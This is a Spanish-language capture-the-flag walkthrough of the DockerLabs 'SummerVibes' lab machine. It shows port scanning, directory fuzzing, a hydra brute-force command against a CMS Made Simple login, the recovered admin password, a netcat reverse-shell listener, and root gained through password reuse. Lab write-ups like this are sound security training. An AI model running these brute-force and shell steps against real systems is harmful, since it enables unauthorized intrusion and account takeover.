---
layout: post
title: "DockerLabs - SummerVibes (hard)"
categories: DockerLabs/machines/hard
---

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/1.png">
</p>

- Esta Máquina es de la plataforma de DockerLabs <https://dockerlabs.es/> en mi opinión es fácil pero esta catalogada como difícil.

## PortScan

```bash
❯ sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 00:52 CST
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d1:19:f1:fa:48:16:af:8a:4a:89:2d:78:89:e9:2d:94 (ECDSA)
|_  256 b8:b7:2e:64:3e:ee:c3:2e:2e:be:99:07:4e:02:4f:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración

- Estas son las tecnologías que esta usando la pagina web.

```ruby
❯ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], Title[Apache2 Ubuntu Default Page: It works]
```

- Esta es la página web.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/2.png">
</p>

- Vamos hacer `Fuzzing` para buscar alguna ruta interesante.

```bash
❯ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
```

- Si analizamos el código fuente de la pagina web encontramos esto que es interesante.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/3.png">
</p>

- Vemos que tenemos un `CMS` <https://www.cmsmadesimple.org/>.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/4.png">
</p>

- Aquí podemos ver la versión.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/5.png">
</p>

- Tenemos varias rutas.

```bash
❯ gobuster dir -u http://172.17.0.2/cmsms -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/cmsms
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/modules              (Status: 301) [Size: 316] [--> http://172.17.0.2/cmsms/modules/]
/uploads              (Status: 301) [Size: 316] [--> http://172.17.0.2/cmsms/uploads/]
/doc                  (Status: 301) [Size: 312] [--> http://172.17.0.2/cmsms/doc/]
/admin                (Status: 301) [Size: 314] [--> http://172.17.0.2/cmsms/admin/]
/assets               (Status: 301) [Size: 315] [--> http://172.17.0.2/cmsms/assets/]
/lib                  (Status: 301) [Size: 312] [--> http://172.17.0.2/cmsms/lib/]
/tmp                  (Status: 301) [Size: 312] [--> http://172.17.0.2/cmsms/tmp/]
```

- Encontramos un panel de login.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/6.png">
</p>

- Vemos que el username por defecto es admin pero no sabemos la contraseña podemos hacer un ataque de fuerza bruta al panel para ver si la contraseña esta en algún diccionario <https://sitemagic.org/sites/cms-guide/How-to-log-in.html#:~:text=The%20default%20username%20is%20admin,password%20immediately%20after%20log%20in!>.

- Capturamos la petición para ver como se tramita la petición.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/7.png">
</p>

```bash
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/cmsms/admin/login.php:username=^USER^&password=^PASS^&&loginsubmit=Submit:User name or password incorrect" -VI
```

- Después de varios intentos encontramos las credenciales.

```bash
[80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate
```

- Podemos entrar.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/8.png">
</p>

## Shell as www-data

- Si buscamos por vulnerabilidades encontramos la siguiente <https://github.com/capture0x/CMSMadeSimple> la versión que esta usando es vulnerable a Remote Code Execution. 

- Nos dan los pasos para explotar la vulnerabilidad en este caso tenemos que ir a User Defined Tags.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/9.png">
</p>

- Vamos a darle en Add.

- Vamos a comprobar que se ejecutan los comandos.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/10.png">
</p>

- Ahora le damos click al tag y le damos en RUN.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/11.png">
</p>

- Y funciona.

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/12.png">
</p>

- Ahora nos vamos a enviar una reverse shell.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

<p align="center">
<img src="/assets/DockerLabs/SummerVibes/14.png">
</p>

> Hay que poner un nombre bien el de la imagen te dará error -> RUN.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.65] from (UNKNOWN) [172.17.0.2] 49072
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fc2f986ff0d9:/var/www/html/cmsms/admin$ script /dev/null -c bash
CTRL+Z
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@fc2f986ff0d9:/var/www/html/cmsms/admin$ export TERM=xterm
```

## Escalada de privilegios

- Bueno al parecer después de enumerar root usa la contraseña chocolate que encontramos al principio.

```bash
www-data@fc2f986ff0d9:/$ su root
Password: 
root@fc2f986ff0d9:/#
```
